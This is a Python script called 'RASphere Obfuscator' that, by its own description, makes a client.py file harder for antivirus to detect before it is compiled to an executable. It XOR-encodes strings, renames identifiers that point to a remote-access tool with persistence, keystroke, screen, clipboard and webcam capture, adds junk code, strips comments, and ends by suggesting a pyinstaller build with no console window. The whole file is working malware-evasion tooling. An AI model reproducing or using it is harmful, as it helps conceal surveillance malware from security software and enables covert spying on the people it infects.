#!/usr/bin/env python3
"""
RASphere Obfuscator
===================
Transforms client.py into an obfuscated version that is harder for
antivirus to detect. Run before compiling to .exe.

Usage: python obfuscator.py [--input client.py] [--output obfuscated_client.py]
"""

import os, sys, re, random, base64, ast, argparse

class Obfuscator:
    def __init__(self, source_path, output_path):
        self.src = source_path
        self.out = output_path
        self.strings = {}
        self.str_counter = 0
        self.name_map = {}  # old_name -> new_name
        self.name_counter = 0

    def _gen_name(self, prefix="v"):
        """Generate a random short variable name."""
        self.name_counter += 1
        return f"_{prefix}{self.name_counter:x}"

    def _obfuscate_string(self, s):
        """XOR obfuscate a string literal."""
        if not s or len(s) == 0: return repr(s)
        key = random.randint(1, 255)
        encoded = bytes(c ^ key for c in s.encode("utf-8"))
        b64 = base64.b64encode(bytes([key]) + encoded).decode("ascii")
        self.str_counter += 1
        var_name = f"_s{self.str_counter}"
        self.strings[var_name] = b64
        return var_name

    def _string_decoder_func(self):
        """Generate the string decoder function."""
        return '''
def _D(b):
    """Decode obfuscated string."""
    import base64
    d = base64.b64decode(b)
    k = d[0]
    return bytes(c ^ k for c in d[1:]).decode("utf-8")
'''

    def _process_line(self, line):
        """Process a single line: replace strings, rename variables."""
        # Skip comment-only lines and blank lines
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            return line

        # Detect string literals and replace them
        # Match single-quoted and double-quoted strings
        result = []
        i = 0
        in_str = None
        start = 0
        
        while i < len(line):
            c = line[i]
            if in_str:
                if c == "\\":
                    i += 2  # Skip escaped char
                    continue
                if c == in_str:
                    # End of string - obfuscate it
                    s = line[start:i+1]
                    actual = ast.literal_eval(s) if s[0] == in_str else s[1:-1]
                    # Don't obfuscate very short strings, f-strings, or format strings
                    if len(actual) > 3 and not line[max(0,start-1):start].endswith("f") and not actual.startswith("{"):
                        var = self._obfuscate_string(actual)
                        result.append(line[:start] + f'_D("{var}")')
                        result.append(line[i+1:])
                        return "".join(result)
                    in_str = None
                i += 1
                continue
            
            if c in ('"', "'"):
                in_str = c
                start = i
            else:
                # Check for triple-quoted strings
                if i + 2 < len(line) and line[i:i+3] in ('"""', "'''"):
                    in_str = line[i:i+3]
                    start = i
                    i += 2
            
            i += 1
        
        return line

    def _rename_variables(self, code):
        """Rename variables using word-boundary-aware replacement."""
        replacements = [
            (r'\bstate\b', '_s'),
            (r'\blogger\b', '_l'),
            (r'\blog\b', '_l'),
            (r'\bHAS_MSS\b', '_h0'),
            (r'\bHAS_PIL\b', '_h1'),
            (r'\bHAS_PYNPUT\b', '_h2'),
            (r'\bHAS_PYCAW\b', '_h3'),
            (r'\bHAS_PYPERCLIP\b', '_h4'),
            (r'\bHAS_PSUTIL\b', '_h5'),
            (r'\bHAS\[.cv2.\]', '_h6'),  # HAS["cv2"]
            (r'\bsetup_handlers\b', '_sh'),
            (r'\binstall_persist\b', '_ip'),
            (r'\buninstall_persist\b', '_up'),
        ]
        for pat, repl in replacements:
            code = re.sub(pat, repl, code)
        return code

    def _add_junk(self, code, num_junk=5):
        """Insert dead code branches that never execute."""
        junk = [
            '\nif False:\n    _x = [i for i in range(1000) if i % 7 == 0]\n    _y = "".join(chr(c) for c in range(65, 91))\n',
            '\nif 0:\n    import hashlib\n    _h = hashlib.sha256(b"dead").hexdigest()\n',
            '\ntry:\n    raise Exception()\nexcept:\n    pass\n',
            '\n_xj = type("X", (), {"__init__": lambda s: None})()\nif _xj is not None and 1 == 2:\n    del _xj\n',
            '\n_ji = 0\nfor _ in [1,2,3]:\n    if False: _ji += 1\n',
        ]
        
        lines = code.split("\n")
        result = []
        for i, line in enumerate(lines):
            result.append(line)
            # Insert junk every ~100 lines
            if i > 50 and i % 97 == 0 and num_junk > 0:
                result.append(random.choice(junk))
                num_junk -= 1
        
        return "\n".join(result)

    def obfuscate(self):
        """Run the full obfuscation pipeline."""
        print(f"[*] Reading {self.src}...")
        with open(self.src, "r", encoding="utf-8") as f:
            code = f.read()

        original_size = len(code)

        # Step 1: Process lines to obfuscate strings
        print(f"[*] Obfuscating string literals ({self.str_counter} strings)...")
        lines = code.split("\n")
        new_lines = []
        for line in lines:
            new_lines.append(self._process_line(line))
        code = "\n".join(new_lines)

        # Step 2: Insert string decoder and encoded strings
        if self.strings:
            decoder = self._string_decoder_func()
            # Store encoded strings
            store = "\n# Encoded strings\n"
            for var, val in self.strings.items():
                store += f'{var} = "{val}"\n'
            
            # Insert after imports
            import_end = code.find("# ── Optional deps")
            if import_end == -1:
                import_end = code.find("\n\n", code.find("import "))
            
            code = code[:import_end] + decoder + store + code[import_end:]

        # Step 3: Rename variables
        print(f"[*] Renaming variables...")
        code = self._rename_variables(code)

        # Step 4: Strip comments
        print(f"[*] Stripping comments...")
        code = re.sub(r'#.*$', '', code, flags=re.MULTILINE)
        code = re.sub(r'""".*?"""', '', code, flags=re.DOTALL)
        code = re.sub(r"'''.*?'''", '', code, flags=re.DOTALL)

        # Step 5: Add junk code
        print(f"[*] Adding junk code...")
        code = self._add_junk(code, num_junk=8)

        # Step 6: Minify whitespace
        print(f"[*] Compressing whitespace...")
        code = re.sub(r'\n\s*\n', '\n', code)

        obf_size = len(code)
        print(f"[*] Size: {original_size} -> {obf_size} bytes ({(obf_size/original_size-1)*100:+.0f}%)")

        with open(self.out, "w", encoding="utf-8") as f:
            f.write(code)

        print(f"[+] Obfuscated output: {self.out}")
        print(f"[+] Strings obfuscated: {self.str_counter}")
        return True


def main():
    parser = argparse.ArgumentParser(description="RASphere Obfuscator")
    parser.add_argument("--input", default="client.py", help="Input file (default: client.py)")
    parser.add_argument("--output", default="obfuscated_client.py", help="Output file")
    args = parser.parse_args()

    if not os.path.exists(args.input):
        print(f"ERROR: {args.input} not found")
        sys.exit(1)

    obf = Obfuscator(args.input, args.output)
    obf.obfuscate()

    print(f"\n[+] Now compile with: pyinstaller --onefile --noconsole {args.output}")


if __name__ == "__main__":
    main()
